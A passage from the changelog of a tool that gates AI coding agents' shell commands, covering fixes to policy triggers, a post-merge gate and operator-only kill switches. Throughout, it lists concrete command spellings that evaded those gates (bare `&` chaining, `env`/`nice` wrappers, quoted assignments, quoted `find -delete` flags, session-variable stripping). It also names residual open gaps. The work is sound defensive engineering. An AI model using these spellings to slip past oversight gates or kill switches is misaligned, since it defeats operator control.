  - The tilde-valued relocating-option residual named above (bypass 4) is NOT fixed at the counting layer — a tilde-valued second `-C` still attributes an own target the way it did pre-fix. Under D-021 this is now SAFE (the cwd demand is added, never dropped) but SPURIOUS: the command also picks up an extra, over-restrictive demand it should arguably not owe. Fail-closed, spurious-but-safe over-demand, not a bypass — a precision follow-up, not a blocker.
  - `${BRANCH}` is still a bare branch name with no repository qualifier, so a same-named branch in two different repositories can still satisfy each other's tag — unchanged, independent of attribution.
  - The static-analysis ceiling every prior entry in this file already names is unchanged and applies here too: a heredoc body, `sh -c '...'`, `eval`, or a base64-decoded payload that constructs a targeted git invocation at runtime is invisible to this (or any) string-level normaliser; such a command still evaluates against cwd only, same as 0.43.0.
  - The `resolveGitContext` primitive this whole mechanism (and 0.42.0's cwd-only resolution before it) rests on is a filesystem-shape check, not a git-validated one: any directory containing a `.git/HEAD` file is a taggable, agent-forgeable repository identity. Additive attribution neutralises the SPECIFIC exploit path this task closes (an agent redirecting which tag is demanded away from the repo a verb truly targets); it does not change this underlying primitive.

  New tests: `tests/runtime/intercept-cli.test.ts` gains the T-001 regression pins (the three 07-27 defects, mandatory), the T-002/T-003 per-segment/per-policy attribution suite, the D-011..D-021 hardening suite (inherited-`cd` additivity, `--work-tree` exclusion, multiple-`-C` ambiguity, the tilde residual, the context bound, dedup, operator-override-in-an-attributed-context, symlink realpath identity), and — this documentation round — a `findGitEntry` upward-walk collapse pin (a relative `-C <subdir-of-cwd-repo>` with no `.git` of its own is ONE cwd decision, not two) and a bound-under-`warn` pin (more than 4 distinct targets on a `warn`-enforcement policy resolves to `warn`, never `deny`, respecting `outcomeForFailedRequires`). `resolverGit`/`riskContext` (the Risk Gate path) is byte-identical across every commit on this task — the 07-27 Risk Gate declassification regression cannot recur here. Docs: `docs/writing-custom-policies.md` (a new section on the per-policy `${REPO}`/`${BRANCH}`/`at_head` resolution and its fallback list), `docs/okf/gate-fail-posture-matrix.md` (the additive fallback posture).

- **SECURITY: post-merge-gate blocker precedence reversed — deny now wins over the escape allowlist, closing the chained-escape bypass where `harness preflight && git push origin master` (the documented preflight-then-push workflow) skipped the gate entirely** (task `19356be7`). `isEscapeCommand` was an OR over the WHOLE command string and `hook-post-merge-gate.ts` checked it first and unconditionally, so any chained command containing an escape verb anywhere (`git switch`, `git stash list`, any `harness ...`) fell out of the gate including its mutation half. The blocker now classifies via the new `isGateEligibleCommand` (post-merge-gate-runtime.ts): gate-eligible iff the curated mutation matcher fires after quoted-heredoc bodies attached to a harness invocation are stripped. **Measured before choosing (66-row corpus, bash ground truth via PATH stubs; `.ai` run `2026-08-02-post-merge-gate-escape-precedence`):** per-segment evaluation and deny-wins are 0-divergent — a consequence of the pinned escape/deny verb disjointness — so the simplest (deny-wins) shipped. The third candidate, escape-at-start-only, was measured and REJECTED: it diverges on 26 rows and still exempts three of the four lines this task exists to close. Against the shipped classifier: **0 false-frees, 0 recovery-chain lockouts** (`git switch <default> && git pull --ff-only` stays free structurally, allowed before any manifest/ledger access), **0 commands newly freed**, and 28 newly gate-eligible = 22 bash-confirmed real mutations + 6 over-blocks. **The 6 over-blocks are the honest cost, listed rather than summarised:** four are the existing quoted-text class (`git pull && echo 'a && git push'` and friends, no longer rescued by a chained escape verb), and two are harness report heredocs whose BODY mentions a mutation verb (`harness approve understanding <<'…'`). Gate-eligible is not blocked: a deny still needs the branch tip to equal a recorded merged tip, and the gate's own recommended recovery stays free.

  **Explicitly NOT done, after two review rounds:** an earlier iteration pre-processed the command to strip quoted-heredoc bodies fed to a harness invocation, so the two over-blocks above would not occur. Round 1 found six shapes where that stripping consumed lines bash really executes; the quote-aware scanner written to fix them was found by round 2 to have twelve more of the same class. Both families share one cause — deciding where a heredoc body begins means re-deriving bash's quote and word grammar on the permissive side of a security boundary — and tasks `dbc6d303` and `5b1b24fb` had already been halted for it. The mechanism was therefore removed rather than patched a third time, and the two over-blocks are accepted and pinned. Task `5b1b24fb` owns the real fix, at the `bash_match` layer for every surface at once. Escape regexes stay exported as deny-message vocabulary and diagnostics. Pack instructions, `docs/policy-packs/post-merge-gate.md`, the blocker hook's `description`, `harness pack hook post-merge-gate --help`, the generated-manifest comment in `harness init --template full`, and `docs/examples/full-manifest.yaml` all updated to stop teaching escape-first, with drift pins on each of those operator-visible surfaces.

- **SECURITY: the ampersand-`&`-boundary gap `BOUNDARY_RE` deliberately left open (0.43.0's `d834a065` entry above) is now closed by a SECOND, independent normalisation pass instead of widening the first, which was measured and reverted for a 140/140 regression** (task `aabbad63`). `src/runtime/command-normalize.ts` gains `AMP_BOUNDARY_RE` (`BOUNDARY_RE` plus a bare `&`) driving `normalizeCommandAmpAware`, consulted by `policyMatchesEvent` (`src/runtime/intercept.ts`) as a THIRD, additional arm — tried only when a policy's regex has already missed both the raw command and the primary (`BOUNDARY_RE`) normalised form, so the fix is strictly additive on top of the two existing arms and never a replacement for either. This closes the family `BOUNDARY_RE`'s own comment named as out of that task's budget: `A=x&env -C /tmp git status` (glued, no space) and `echo hi & nice git status` (a genuine bash background job). **Measured, corrected numbers (review round 1 found the shipping build's own closure claim wrong):** over 7 wrappers (`env`/`nice`/`sudo`/`command`/`setsid`/`stdbuf`/`nohup`) × 4 gated verbs × 2 shapes (`A=x&<wrapper> <verb>`, `echo hi & <wrapper> <verb>`) = 56 realistic spellings, 28/56 were ALREADY gated before this change (raw or the primary normalised arm), 52/56 gate after — a delta of 24 attributable to this arm alone — and 4 remain ungated, all `echo hi & nohup <gated verb>` (`nohup` is not one of `canonicalizeSegment`'s recognised wrapper names, a pre-existing, already-documented module-header gap — not something either boundary alphabet can reach, pinned in `tests/runtime/command-normalize.test.ts`). The pre-change 28/56 is high because the shipped trigger regexes' own `(\w+=\S+\s+)*` leading-assignment group lets `\S+` swallow a glued `&<wrapper>` (`A=x&nice git push` already matched the RAW regex before this task ran at all), so the GLUED family was never actually what needed closing — the background-job family (`echo hi & <wrapper> <verb>`) is. `AMP_BOUNDARY_RE`'s alternation order (`&&` left of bare `&`) is load-bearing for JS's leftmost-first alternation and is pinned by execing a clone of the exported regex directly (fix round 1, finding F9 — the original pin exec'd the shared, exported `/g` object itself, leaving `lastIndex` mutated for whatever ran next), since the ordering is invisible in this module's own segment-and-rejoin output string — verified by swapping the order and diffing output, byte-identical either way. **New false-positive class, widening an already-accepted one, not introducing a new one:** on a 160-form quoted-text corpus arbitrated by real bash (PATH-shimmed verbs + a marker file), 144 spellings of `<text> & <wrapper> <gated verb>` INSIDE a quoted string now match where the base build did not, and bash ran the verb in 0 of them — but the wrapper-LESS variant of the same shape (`echo 'a & git push'`) already false-alarmed on the base build 16/16 via the RAW regex alone, since every shipped trigger already anchors on a bare `&` (task `d834a065`); this widens that already-accepted over-block class to the wrapped spellings rather than introducing a new one. The opposite direction, on the general (non-adversarial) corpus: of 276 matches this pass gains there, all 151 classifiable ones were TRUE positives, 0 false alarms. Engine-side fix: applies on package upgrade, no manifest change required. **Fix round 1 also closed three inert/misleading test and comment surfaces found by review, none of them behavioural:** (1) the CLI-side memoising thunk (`ampNormalizedCommandThunk`, `src/cli/policy/intercept.ts`) and its production wiring into `intercept()` had zero test coverage that actually drove an event through `runInterceptCli` — the existing "memoising thunk" test built its own closure and proved only that a memoising closure memoises; a new `runInterceptCli`-level test (counting real `normalizeCommandAmpAware` calls via a call-through mock) now goes red under either of two measured mutations (replacing the `??=` memoisation with a plain call; deleting the thunk's spread into `intercept()` entirely) that previously left the whole suite green. (2) That same once-per-event discipline never covered a Codex shell event (`tool_name: "shell"` / `"exec_command"` / `"functions.exec_command"`) whose command lived under `raw_input`/`input` or a `cmd` key: the CLI wrapper built the precompute and the thunk from `event.tool_name === "Bash"` + `tool_input.command` only, while the matcher itself (`extractShellCommand`) reads all three input locations and either key — so such an event ran BOTH normalisation passes once PER MATCHING POLICY instead of once per event. Now derived from `extractShellCommand(event)` directly (guarded by the existing `isCodexShellTool`), which also makes the precomputed value and the matcher's own value provably consistent for every event in `SHELL_ALIASES`. (3) `findNextBoundary`'s `lastIndex` reset was documented as preventing the two passes from clobbering each other's scan position, which measured false (0 output differences across the corpus with the reset removed) — they are two distinct regex objects with nothing to clobber; reworded to the actual reason (throw-safety for a hypothetical caught-and-resumed scan) and marked unreachable under today's control flow, since nothing in this module catches mid-scan and resumes. New tests: `tests/runtime/command-normalize.test.ts` (the still-ungated `nohup` residual pin, the alternation-order clone fix), `tests/runtime/intercept-cli.test.ts` (the `runInterceptCli`-level once-per-event pin for both a Bash and a Codex shell event). Docs: `docs/okf/policy-engine-producer-wiring.md`, `docs/okf/debug-verb-selection.md`, `docs/okf/gate-fail-posture-matrix.md` (a new row/paragraph for the amp pass's identical `MAX_NORMALIZE_LENGTH` fail-open).

- **SECURITY: the four surfaces `0.43.0`'s `d834a065` entry named as "deliberately left on the old alphabet" now recognize a bare `&` as a command boundary too, closing follow-up `76671e5a`** — `CURATED_MUTATION_BASH_RE` and `GH_PR_MERGE_BASH_RE` (`src/policy-packs/builtin/post-merge-gate-runtime.ts`), `DEFAULT_PUSH_BASH_RE` (`src/policy-packs/builtin/solution-acceptance-runtime.ts`), and this repo's own `dogfood/harness.yaml`'s `dogfood-recency` trigger. Same fix as `d834a065`: `&&` is subsumed rather than dropped (in `A=x&&git push` the second `&` itself serves as the boundary), so the change is strictly more permissive. **Loss measured with a passing positive control, so the zero means something:** over a 49,999-string corpus, 0 of the old alphabet's matches were lost on any of the four surfaces, all four gained real, bash-verified true positives, and a narrowing control (reverting the fix) reintroduced losses on the same corpus, proving the instrument can actually detect a regression rather than being saturated. No lockout of the documented recovery path either: across 5,258 two-segment and 5,880 three-segment recovery-then-deny commands, the broadened deny side never also matches as an escape command. **New, ACCEPTED false-positive class, widening the one `d834a065` already disclosed for `&&`:** a gated verb mentioned as TEXT after a literal `&` inside a quoted string now matches on all four surfaces too (e.g. `echo "a&git push"`, `grep -F 'x&git commit' notes.md`) — verified against the live PATH that bash never runs the gated verb in any of them, so this is an over-block, not an under-block; pinned in `tests/policy-packs/post-merge-gate-runtime.test.ts` rather than left unrecorded, matching the standard `d834a065` set. **Deliberately left narrow, not swept:** `ESCAPE_GIT_BASH_RE` / `ESCAPE_HARNESS_BASH_RE` (same file) stay on the old, `&&`-only alphabet — they are ALLOW-lists checked first and unconditionally, so widening their boundary alphabet would LOOSEN a gate instead of hardening it, the same reasoning `0.43.0` already gave for not sweeping them. Consequence, measured rather than assumed: 480 of the 5,880 three-segment corpus commands, all of exactly one shape (`<LEAD> & <RECOVERY> & <DENY>`, e.g. `sleep 0&git switch master&git push`), become newly blocked, because the recovery verb is reachable only via the bare `&` the narrow escape check does not recognize. Not a lockout: every such command also contains a mutation verb bash really runs, and the plain recovery alone (`git switch master`, no bare-`&` chaining) is never blocked — pinned as an accepted asymmetry so a future sweep that widens the escape list has to make that decision consciously. **Fix round 1, review findings, none of them behavioural:** a test comment claiming `dogfood/harness.yaml` is a self-inflicted release gate for this repo was false (measured: `harness apply --config dogfood/harness.yaml` exits 1 and rejects it, since the file is a `harness validate`/`harness doctor` fixture, never an applied manifest) and is corrected to describe it as that fixture instead; the source-level allow-list pin that counted `&` characters missed a real widening (`&&?` matches a single bare `&` while keeping the same character count) and is replaced with an exact assertion on the boundary group's source text; the "`&&` stays left of bare `&`" comments on the three runtime regexes overclaimed an ordering requirement that measurably does not hold for a `RegExp.test` matcher (byte-identical match sets swapping to `&|&&` — the segmenter reasoning in `command-normalize.ts` does not transfer here) and are reworded; the dogfood-recency trigger gained a test that actually compiles and fires the pattern (the prior drift guard only string-scanned for the old alternation substring, so a broken regex would have stayed green). New tests: `tests/policy-packs/post-merge-gate-runtime.test.ts` (accepted-over-block pin, escape/asymmetry pin, exact boundary-group pin), `tests/cli/init-full-template-pins.test.ts` (dogfood-recency compiled-trigger pin).

- **SECURITY: the read-only-bash write-flag guards now decode shell quoting before comparing, closing seven measured fail-opens where a quoted or escaped write flag hid from the guard while bash still honoured it** (slice 1, PR #392). `find . -"delete"`, `find . -'delete'`, `find . -\delete`, `find . -$'delete'`, `find . -de"lete"`, `sort --outp"ut"=out.txt` and `file --"compile"` all ran as "read-only" past the classifier — exact set-membership (`FIND_WRITE_FLAGS.has`) and long-flag prefix tests (`startsWith("--output=")`) were fully defeated, while short-flag cluster tests survived only by accident (the flag letter stayed a substring of the quoted token). New `src/runtime/shell-word.ts` `decodeShellWord` (quote removal + escape decoding only — ANSI-C `\xHH`/`\NNN`/`\uHHHH`, per-quote backslash rules, run concatenation; NO `$VAR`/`$()`/backtick/`~`/glob expansion) is applied before every write-flag comparison. Per its module-header direction rule, the decoded value is used only on the RESTRICTIVE side — to recognise MORE tokens as write flags, never fewer — and `decodeShellWord` returns the raw token for anything it cannot resolve, so an incomplete partial-bash model degrades to today's behaviour, never a new fail-open (the property that distinguishes it from the permissive-side heredoc-strip model removed the same day).

- **`fast-uri` bumped to a patched release via `npm audit fix`** (lockfile-only, no source change), closing GHSA-7p8r-x3mc-p8w7 (host confusion via a backslash authority introducer; high severity). Transitive build/test dependency, not on the CLI's shipped runtime path.

## [0.43.0] - 2026-08-01

> **Upgrade note:** the template-level changes in this release — the single-`&` trigger boundary (including the `operator_only` kill-switch deny) and the `mcp__grounding-mcp__` tool-prefix rename — live in the manifest templates, so an EXISTING install keeps its old `harness.yaml` triggers until the operator re-runs `harness init` (or edits the manifest by hand). The engine-side normaliser fixes below apply on package upgrade with no manifest change.

### Security

- **A single `&` was not a command boundary to any policy trigger, so a gated verb placed after one reached no gate at all, including an `operator_only` deny** (task `d834a065`). bash starts a new command after `&`, but the alternation every shipped `policies[].trigger.bash_match` shares listed only `&&`. Measured through the real prediction path against `docs/examples/full-manifest.yaml`, with each policy plain form as its own positive control and a PATH shim proving the verb really executed: `A=x&git status`, `A=x&git push`, `A=x&gh pr merge` and `A=x&harness pause` all missed their trigger, and `sleep 0 & git status` misses with no assignment prefix at all, so this is a boundary-alphabet gap rather than a quote-model one. The `harness pause` case is the sharpest: `deny-kill-switch-bypass` is `operator_only: true`, which no in-session evidence can open, and one character walked around it. Fix: the `&&` alternative becomes `&` in every policy trigger across `src/cli/init/templates.ts` and `docs/examples/full-manifest.yaml`. `&&` is subsumed rather than dropped, since in `A=x&&git status` the second `&` serves as the boundary, so the change is strictly more permissive and is pinned in both directions. **Cost, measured rather than argued** (the analysis that found this could not measure precision at all, 75 of 75 axes without a reference): a false-alarm corpus with bash deciding whether the verb really runs reports 3 pre-existing false alarms and 6 new ones, every new one of the shape "gated verb mentioned as text after a literal `&`" (`echo "a & git status"`, the same string inside a heredoc body, after a `#` comment, as a `grep` pattern, or as an assignment value). One more spelling outside that corpus behaves the same way: `sed -i 's/foo/& git status/' notes.md`, since `&` is sed's whole-match backreference. That is the already-open `dbc6d303` class, which fires on `&&` in text today, widened by one spelling; the direction is fail-closed. **Which policy a false alarm lands on matters, so it is recorded rather than averaged:** most land on `requires:`-gated policies an agent can satisfy itself, but a mention of `harness pause` after an `&` now trips `deny-kill-switch-bypass`, which is `operator_only: true` and has NO in-session recovery path. Writing prose that quotes this very fix in a Bash heredoc is enough to hit it. Measured live twice while reviewing this change. **Surfaces deliberately left on the old alphabet, named rather than swept:** three policy-pack runtime regexes (`CURATED_MUTATION_BASH_RE` and `GH_PR_MERGE_BASH_RE` in `src/policy-packs/builtin/post-merge-gate-runtime.ts`, `DEFAULT_PUSH_BASH_RE` in `src/policy-packs/builtin/solution-acceptance-runtime.ts`) and this repo's own `dogfood/harness.yaml`. They carry the identical gap on live gate surfaces, but a blanket sweep would be wrong: `ESCAPE_GIT_BASH_RE` / `ESCAPE_HARNESS_BASH_RE` in the same pack file are ALLOW-lists checked first, so widening those would LOOSEN a gate instead of hardening it. Tracked as follow-up `76671e5a` so the per-surface direction is decided rather than assumed. **What this does NOT touch:** `expire_on_bash_match` is a separate anchored family (`^gh pr (merge|close)`, `^git push origin (master|main)`) with no boundary alternation, deliberately left alone because widening it would change ledger-expiry semantics, and now pinned to stay anchored and alternation-free. Also unchanged: the quote-model bypasses (`cf3dff51`, `b093911d`) that survive this fix, and the head-spelling gaps (`"git" status`, `\git status`). A second emitter carried the same hole and is fixed here too, found by review rather than by the original sweep: `src/cli/init/composer.ts`, the `harness init --interactive` Custom profile, six patterns, so the bypass stayed live for every operator who picked Custom. Loss for the trigger layer was measured against the previous patterns with a passing positive control: **0 of 7,764 old matches lost** across all 15 shipped patterns, 900 newly matched, over a 68,040-string corpus of assignment prefixes, separators, wrappers and gated verbs. That number covers the RAW trigger layer only.

**A third change was attempted, measured, and REVERTED, recorded here because the attempt is the useful part.** `BOUNDARY_RE` in `src/runtime/command-normalize.ts` has the same gap, and leaving it means the adjacent spelling `A=x&env -C /tmp git status` stays ungated (a wrapper can only be peeled after a recognised boundary). Adding `&` there closed that and 259 similar spellings, but review measured what the first corpus never sampled: `BOUNDARY_RE` is quote-unaware, `&` inside a quoted assignment value is common, and the split lands mid-quote so the value continuation never engages. Independently reproduced with a passing positive control: **140 of 140** sampled `<wrapper> FOO='a&b' <gated verb>` spellings LOST a gate they held before, including the `operator_only` kill-switch deny. Closing one bypass while opening a wider one is not a trade worth shipping, so the edit is reverted and the module now carries the measurement so the next attempt starts from it. The remaining `A=x&env ...` gap is tracked separately; it needs a design that does not regress the quoted-value case, not another character in that alternation. New tests in `tests/cli/init-full-template-pins.test.ts` (data-driven over all three profile templates plus `composeCustom()` output, asserting that EVERY declared trigger is exercised rather than merely one, and a negative pin that no shipped `bash_match` string in the templates, the composer, the example manifests or the docs still carries the old alternative, scanning each file as one whitespace-collapsed string because a per-line scan went blind to the four prettier-wrapped composer values, which a mutation confirmed) and `tests/cli/init-full-template-kill-switch-deny.test.ts`. The docs that taught the vulnerable anchor (`docs/writing-custom-policies.md`, `docs/ARCHITECTURE.md`, `docs/examples/policies/02-clean-check-before-push.yaml`) are updated, since they were the propagation vector.

- **A git-verb `bash_match` policy trigger could be silently defeated by wrapping the command, and the bypass left NO audit trail at all — no ledger query, no decision, no `harness audit` row** (task `ea8becf5`). `preflight-before-investigation`'s trigger was a raw regex requiring the literal token `git` at a shell boundary, optionally preceded by `VAR=value` tokens; `env`/`nice`/`command`/`sudo`/`doas`/`time`/`timeout`/`stdbuf`/`setsid` wrappers, any git global option other than `-C`, a path-qualified `git` binary, or even a doubled space between `git` and its subcommand all defeated it. Reproduced live: `env -C <repo> git status` reached an un-preflighted repository while `cd <repo>; git status` was correctly blocked. Fix: a new pure normaliser, `src/runtime/command-normalize.ts`, peels the wrapper prefixes above (matching the git token by basename, e.g. `/usr/bin/git`) and canonicalises a git invocation's own global options (`-C`, `-c`, `--git-dir`, `--work-tree`, `--no-pager`, `--exec-path`, `--namespace`, …) down to `git <subcommand>`; `policyMatchesEvent` (`src/runtime/intercept.ts`) now tests each `bash_match` regex against the raw command and, only on a raw miss, against the normalised one — additive by construction, so nothing gated before this can become ungated, pinned by a superset test. This change lives entirely in the engine, so an already-installed manifest is fixed on upgrade — no `harness apply` or manifest edit required. **What this does NOT close, so no doc or commit claims it does:** only a `bash_match` whose peeled head token is literally `git` benefits at all. `review-before-merge-bash`'s `gh pr merge` trigger, `review-subagent-before-pr-create-bash`'s `gh pr create` trigger, `dogfood-before-release`'s `npm publish` half (its `git tag v` half IS covered), and all three `deny-*` operator-only kill switches (`harness pause`/`resume`/`gate`, the session-env-strip pattern, the pause-sentinel-write pattern) remain exactly as wrapper-bypassable as before this change — do not read it as having hardened those (since narrowed in this same Unreleased batch by task `432db3d3`, see below: the `gh`/`npm publish`/`harness` head tokens are now covered, while `deny-session-env-strip` and `deny-pause-sentinel-forgery` remain open there too). Also still open: `xargs git status` (deliberately excluded — `xargs` can invoke its wrapped command zero, one, or many times, unlike a transparent wrapper), a quoted subcommand (`git "status"`), backtick command substitution (`` echo `env -C /tmp git status` ``), `sh -c`, heredocs, `eval`, base64-decoded payloads, and quoted paths containing whitespace. **Correction (review round 2): `$(...)` command substitution is NOT open, unlike the backtick case right before it** — `echo $(env -C /tmp git status)` demonstrably blocks today, ACCIDENTALLY: `$(...)`'s opening paren happens to be the exact `(` character this module already treats as a shell boundary for the `(cd X && ...)` leading-subshell case, so it falls out of that, not a deliberate feature, and is now pinned by a dedicated test so an unrelated future edit can't silently drop the coincidence. Ten more measured bypasses found in the same review round (G2 finding, 2026-07-27), none of them peeled wrapper prefixes or a recognised `git` spelling: `exec`/`nohup`/`ionice`/`flock`/`script`/`chrt`/`taskset` wrapping `git status`, a backslash-escaped `git` token (`\git status`), a quoted git BINARY name (`"git" status` — the mirror image of the quoted-subcommand gap above), and `env -S "git status"` (the split-string flag hands off to a fresh, deliberately-opaque re-parse). An eleventh, `nice -10 git status` (the bare-dash form `nice(1)` documents as its PRIMARY spelling), was measured as a bypass in the same pass but is now CLOSED (G3 fix, review round 2): `nice` stays in the peeled-wrapper list, this just widens which of its own spellings are recognised. And an `env`-argument spelling like `--default-signal=INT`, which only one of the two independent env-peelers previously recognised, is ALSO now closed (G6 fix, review round 2): the earlier fix here (sharing the flag-NAME enumerations via exported constants in `src/runtime/read-only-bash.ts`) had only closed the flag-name-SET drift, not this specific bypass, which needed its own generic glued-`--long=value` catch-all mirrored into this module too. Separately (G4 finding, review round 2): above `MAX_NORMALIZE_LENGTH` (100,000 chars), normalisation used to skip SILENTLY — no stderr line, no audit row; `harness policy intercept` now emits one stderr line reporting the skip, and `docs/okf/gate-fail-posture-matrix.md` gained a matching row. **Newly widened false positives** (pre-existing class, task `dbc6d303`): quoted or heredoc text mentioning a wrapped git verb can now trigger where it previously did not — but only when the mention sits at a shell-boundary position (line start, or after `;` / `|` / `&&` / `(`), which is narrower than "anywhere in quoted text": measured, `echo "a; env git status"` blocks while `echo "env -C /tmp git status"` does not. Hit three times live during this fix's own development: an Understanding Report heredoc, a commit message containing an `&& git push` example, and a reviewer's own probe script whose case labels contained the literal verbs. `harness dry-run`'s trigger prediction now matches raw-or-normalised the same way `policy intercept` does, closing a debug-verb/runtime prediction mismatch on the identical spellings above.
  - **Per-repository target resolution is explicitly NOT part of this task, and no doc or commit claims otherwise.** `${REPO}`/`${BRANCH}` (`src/cli/policy/intercept.ts`) still resolve from the hook's own cwd alone, exactly as in 0.42.0: a command that explicitly names a different repository (`git -C <B>`, `env -C <B>`, a leading `cd <B> &&`) does not change what `${REPO}`/`${BRANCH}` name. A `preflight:<repo>` fact recorded for repository A therefore still authorises a command that explicitly reads (or, chained, mutates) repository B — unchanged from the shipped 0.42.0 behaviour, not a new gap introduced here. A per-command target-directory resolution for these builtins was built and reviewed on this same task, but was found to regress security in three consecutive review rounds — Risk Gate risk declassification, a push-gate multi-invocation fail-open, and (found twice: first fixed via `&&`-chain coverage, then found still open via `|`/`||` chaining) a non-git gated verb inheriting a decoy repo's target from an unrelated, `-C`-scoped git call sharing the same command line (e.g. `git -C <decoy> rev-parse HEAD | gh pr merge`) — and was removed before shipping rather than patched a fourth time. Each fix was only ever partial because a single `targetDir` per event cannot express "this invocation targets repo B, but the gated verb after it runs in the caller's own cwd"; the correct fix needs to attribute a target to the SEGMENT that actually satisfies a policy's own trigger, which means the policy builtins becoming per-policy instead of per-event — an architectural change out of scope for this task, tracked as follow-up task `98ad072f`. The extraction this would have been built on (`command-normalize.ts`'s `targetDir`/`targetBase`, including its own git-vs-git and git-vs-non-git ambiguity rules) stays in the tree, fully tested but unwired, as that follow-up's foundation. New tests: `tests/runtime/command-normalize.test.ts`, new suites in `tests/runtime/intercept-cli.test.ts` and `tests/cli/dry-run.test.ts` (the G1 git-vs-non-git-verb ambiguity cases through the real `review-before-merge-bash`/`review-subagent-before-pr-create-bash`/`dogfood-before-release` triggers, the G2 ten-spelling ceiling plus the `$(...)` accidental-coverage pin, the G3 `nice` bare-form cases, the G6 `env --default-signal=INT` case, a `policy intercept` end-to-end pin on the G4 stderr line, and an explicit regression test that a command naming a foreign target repo resolves `${REPO}`/`${BRANCH}` to the CWD repo, not the named target, so a future reintroduction of target resolution cannot land unnoticed). Docs: `docs/okf/gate-fail-posture-matrix.md`, `docs/okf/debug-verb-selection.md`, `docs/okf/policy-engine-producer-wiring.md`, `docs/okf/codex-adapter-parity-gaps.md`, `docs/okf/pause-vs-gate-kill-switch.md`.

- **Non-git `bash_match` triggers no longer lose to a one-word wrapper: `command-normalize.ts`'s head-token condition widened from literally-`git` to the closed set `git`/`gh`/`npm`/`harness`** (task `432db3d3`, follow-up to the `ea8becf5` entry above). Measured closed, per spelling through the real hook entry point with the shipped 0.42.0 binary as negative control: `env` / `env -C <dir>` / `nice` wrapping the `gh pr merge` verb, `env` wrapping `gh pr create`, `env` / `nice` wrapping `npm publish`, `env` / `nice` / `command` / `env -C <dir>` wrapping `harness pause`, plus whitespace-run spellings (`gh  pr merge`, `gh pr  merge`, tab forms, `npm  publish`) — the interior-run group via a full-segment single-space rejoin for set heads, because collapsing only the head-adjacent gap measurably left `gh pr  merge` open (review finding). Matching stays raw-OR-normalised and therefore strictly additive (superset pinned), with a new ordering pin: `env -u CLAUDE_CODE_SESSION_ID npm publish` must keep blocking `deny-session-env-strip` via the RAW match — the one shipped shape where the normalised form erases what another policy keys on, so this single test goes red if raw-first matching is ever collapsed to normalised-only. **What this does NOT close, measured and pinned rather than implied: only one of the three operator-only kill switches benefits.** `deny-session-env-strip` keys on `env`/`unset` head tokens and is structurally out of the normaliser's reach (its peel loop consumes `env -u <VAR>` while hunting for a gated command behind it, erasing the very text that trigger keys on); `deny-pause-sentinel-forgery` keys on `tee`/`cp`; both remain one-wrapper-word bypassable (`nice env -u CLAUDE_CODE_SESSION_ID ls`, `nice tee <sentinel>`), pinned as explicit not-covered tests. Also uncovered and pinned: tool-specific flags between head token and subcommand (`gh -R`, `npm --loglevel`) and path-qualified `gh`/`npm` spellings (byte-identical through the normaliser; a path-qualified `harness pause` still denies via the trigger regex's own `\S*/` alternative at the raw level). New false-positive class recorded: introspection spellings (`command -v harness pause`, `sudo -l harness pause`) now deny — over-block direction, distinct from the quoted/heredoc class (task `dbc6d303`), which this change widens twice: to wrapped non-git verb mentions at shell-boundary positions, and — via the full-segment rejoin — to whitespace-run spellings of them inside quoted text (measured example: `harness explain-policy --command "( npm  publish )"` now matches where only its single-spaced variant did before). A new drift guard, `tests/runtime/bash-match-head-token-drift.test.ts`, couples the engine's head-token set to `FULL_TEMPLATE`'s actual `bash_match` policies (policy inventory plus per-token spelling presence), so the next policy gating a new head token turns a test red instead of staying silently uncovered; the guard's own residual — a new alternative added ALONGSIDE a still-correct token inside an existing policy's regex escapes both checks — is stated in the test file header. Docs: the `deny-kill-switch-bypass` UPDATE comment in `src/cli/init/templates.ts` and `docs/okf/pause-vs-gate-kill-switch.md` now state the partial closure precisely instead of the pre-fix "no-op unless `git`" claim.

- **SECURITY: a quoted env-assignment value with embedded whitespace (`VAR='hello world' git push`) bypassed every `bash_match` gate on BOTH matching layers — closed by continuing the assignment's value across tokens in the normaliser** (task `13e55484`, found by a read-only explorer during `d977ad58` and verified against the shipped binary, not derived). Measured at the real hook entry point with shipped 0.42.0 as control: `VAR='hello world' git push origin master` and `VAR='hello world' gh pr merge 4242 --squash` both produced "no policy matched" while their plain spellings blocked. The two layers failed on the same character: the raw regex's `(\w+=\S+\s+)*` cannot span an embedded space, and `command-normalize.ts`'s whitespace tokenizer split the assignment into `VAR='hello` + `world'`, the second token aborting the wrapper-peel loop so the segment came back byte-identical. Fix: a `consumeAssignment` helper continues an assignment's VALUE across whitespace-split tokens while an opening quote from that assignment stays unbalanced at a token's end AND a matching close exists in a later token, used by both the top-level peel loop and `peelEnv`'s own assignment scan (`env VAR='a b' git push` was the same bypass one wrapper deep) — deliberately NOT a general quote-aware tokenizer. **Review round 1 found the first version's load-bearing claim ("additive by construction") FALSE by measurement (CRITICAL, fixed before merge):** a 30k-case seeded differential fuzz against a master worktree surfaced 482 lost matches, rooted in ANSI-C quoting — bash escapes `\'` inside `$'...'`, a plain-`'...'` scanner closes on it — so `A=$'don\'t' env harness pause # '` left a phantom-open state that swallowed the gated head token and turned three MASTER-BLOCKED commands (push gate, merge gate, and the operator-only kill-switch deny) into "no policy matched", PATH-shim-verified as real invocations. Closed with a ONE-DIRECTIONAL GUARD: the continuation abandons back to the byte-exact pre-task one-token consume the moment the token it would consume next matches `GIT_TOKEN_RE` or `NON_GIT_HEAD_TOKENS`. **Scope of the guarantee, corrected in round 2 after the first re-wording overclaimed again:** the guard closes the HEAD-SWALLOW channel specifically (a diverging quote state can never swallow or re-target a recognised head token — round-2 re-verified: the round-1-style differential fuzz lost 0 of 19,994 cases). It is NOT universal monotonicity: a second, round-2-measured channel remains where the continuation closes on a wrapper's glued flag token and the peel resumes at that wrapper's next argument (`A='x timeout --signal=INT' 5 git push` matched on master, does not here — 550 of 41,440 adversarial cases). Every found member is a MASTER FALSE POSITIVE, PATH-shim-verified (110 are `bash -n` syntax errors, the other 440 execute the next word — `5`, `-e0` — never the gated verb), so no gated invocation is lost and the branch is the more bash-accurate side; the class is pinned so it cannot silently widen. Differential regression pins: the three ANSI-C repros, a wrapper-swallow case (`env VAR='a git push origin master' foo`), the wrapper-argument-list class above, and a path-qualified-glued-quote case (`VAR='a /usr/bin/git' git push` — the guard's exact-spelling check does not abandon there, and the REAL invocation behind it now matches, a measured fail-closed gain). An UNTERMINATED quote (`VAR='a git push`) keeps its pre-task normalised match, and the engagement assurance was re-scoped after being measured not load-bearing (the whole-corpus ≥8 threshold stayed green with every quoted entry deleted): every quoted-assign corpus entry must now match ONLY via normalisation, ≥4 entries, so disabling the continuation reddens the assertion itself — the dbc6d303 lesson applied twice. Closure pinned per variant: double quotes, multiple mixed-quoting assignments, assignment+wrapper, env-internal assignment, tab-in-value, chained quote runs (`'a b'"c 